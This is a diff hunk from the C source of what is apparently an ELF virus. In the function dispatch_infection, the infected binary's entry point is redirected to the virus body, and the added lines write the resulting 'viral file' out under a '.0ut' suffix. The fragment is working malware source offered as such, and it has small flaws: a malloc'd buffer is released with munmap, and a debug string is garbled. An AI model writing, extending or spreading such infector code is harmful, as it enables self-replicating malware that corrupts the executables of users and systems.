@@ -276,6 +276,27 @@ int dispatch_infection(Elfbin *target)
 		hdr->e_entry = target->vx_vaddr;
 	}
 
+	size_t f_path_len = anansi_strlen(target->f_path);
+	char *v_name = anansi_malloc(f_path_len + 5);
+	int fd_out;
+	anansi_strncpy(v_name, target->f_path, f_path_len);
+	anansi_strncpy(v_name + f_path_len, ".0ut", 4);
+#ifdef DEBUG
+	anansi_printf("\t\t\tCreateding viral file %s\n", v_name);
+#endif
+	fd_out = anansi_open(v_name, O_CREAT | O_WRONLY, S_IRWXU | S_IRGRP | S_IROTH);
+	if(fd_out < 0) {
+#ifdef DEBUG
+		anansi_printf("failure to open v_name\n");
+#endif
+		return -1;
+	}
+#ifdef DEBUG
+	anansi_printf("new_size @@ %d\n", target->new_size);
+#endif
+	anansi_write(fd_out, target->write_only_mem, target->new_size);
+	anansi_close(fd_out);
+	anansi_munmap(v_name, f_path_len + 5);
 	return 0;
 }
 
